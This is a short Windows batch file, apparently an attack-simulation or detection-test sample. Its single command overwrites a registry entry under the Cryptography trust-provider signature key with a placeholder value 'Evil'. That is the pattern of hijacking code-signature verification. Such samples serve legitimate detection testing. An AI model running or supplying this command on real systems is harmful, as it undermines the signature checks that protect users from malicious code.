@echo off
reg add "HKLM\SOFTWARE\WOW6432Node\Microsoft\Cryptography\Providers\Trust\Signature\{00AAC56B-CD44-11D0-8CC2-00C04FC295EE}" /v $Function /t REG_SZ /d Evil /f
